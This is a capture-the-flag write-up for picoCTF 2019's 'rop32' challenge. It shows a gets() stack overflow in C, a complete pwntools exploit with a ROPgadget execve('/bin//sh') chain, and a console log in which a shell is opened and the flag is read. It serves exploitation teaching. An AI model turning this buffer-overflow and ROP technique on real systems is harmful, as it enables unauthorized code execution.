# rop32
Binary Exploitation, 400 points

## Description:
> Can you exploit the following program to get a flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("Can you ROP your way out of this one?\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}

```


## Solution:

This challenge is similar to last year's [can-you-gets-me](/2018_picoCTF/can-you-gets-me.md). We use the same strategy as last year, utilizing [ROPGadget](https://github.com/JonathanSalwan/ROPgadget) to create the ROP gadget for us.

Note that we had to supply a `--badbytes 0a` to `ROPGadget` in order to receive an exploit that doesn't contain a line feed (a.k.a. newline, `\n`, or `0xa` in ASCII). Otherwise, `gets()` will remove anything after it and the ROP chain will fail: 

> The C library function char *gets(char *str) reads a line from stdin and stores it into the string pointed to by str. It stops when either the newline character is read or when the end-of-file is reached, whichever comes first.

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/rop32_2_8cd220e3284b3f110fe852cc6ec9e564/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import os
from struct import pack

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Can you ROP your way out of this one?", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(50, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset

def get_rop(overflow_offset):
    # execve generated by ROPgadget
    # ROPgadget --binary ./vuln  --ropchain --badbytes 0a

    p = ''

    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '/bin'
    p += pack('<I', 0x080da060) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da064) # @ .data + 4
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '//sh'
    p += pack('<I', 0x080da064) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x080da060) # padding without overwrite ebx
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x08049563) # int 0x80

    return fit({overflow_offset: p})

overflow_offset = get_overflow_offset()

io = start()
payload = get_rop(overflow_offset)

log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

io.interactive()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/rop32# python exploit.py
[*] '/media/sf_CTFs/pico/rop32/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.uDn639usty'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/rop32_2_8cd220e3284b3f110fe852cc6ec9e564'
[+] Starting local process '/media/sf_CTFs/pico/rop32/vuln': pid 1244
[*] Process '/media/sf_CTFs/pico/rop32/vuln' stopped with exit code -11 (SIGSEGV) (pid 1244)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/rop32/core.1244'
    Arch:      i386-32-little
    EIP:       0x61616168
    ESP:       0xffdefe20
    Exe:       '/media/sf_CTFs/pico/rop32/vuln' (0x8048000)
    Fault:     0x61616168
[*] Overflow offset: 28 (4-byte architecture)
[+] Starting remote process '/problems/rop32_2_8cd220e3284b3f110fe852cc6ec9e564/vuln' on 2019shell1.picoctf.com: pid 387
3851
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  6b ee 06 08  │eaaa│faaa│gaaa│k···│
    00000020  60 a0 0d 08  34 63 05 08  2f 62 69 6e  60 a0 0d 08  │`···│4c··│/bin│`···│
    00000030  41 41 41 41  65 6e 05 08  6b ee 06 08  64 a0 0d 08  │AAAA│en··│k···│d···│
    00000040  34 63 05 08  2f 2f 73 68  64 a0 0d 08  41 41 41 41  │4c··│//sh│d···│AAAA│
    00000050  65 6e 05 08  6b ee 06 08  68 a0 0d 08  20 64 05 08  │en··│k···│h···│ d··│
    00000060  65 6e 05 08  c9 81 04 08  60 a0 0d 08  92 ee 06 08  │en··│····│`···│····│
    00000070  68 a0 0d 08  60 a0 0d 08  6b ee 06 08  68 a0 0d 08  │h···│`···│k···│h···│
    00000080  20 64 05 08  fa c2 07 08  fa c2 07 08  fa c2 07 08  │ d··│····│····│····│
    00000090  fa c2 07 08  fa c2 07 08  fa c2 07 08  fa c2 07 08  │····│····│····│····│
    *
    000000b0  63 95 04 08                                         │c···││
    000000b4
[*] Switching to interactive mode

$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{rOp_t0_b1n_sH_44c05daa}$ $
[*] Interrupted
```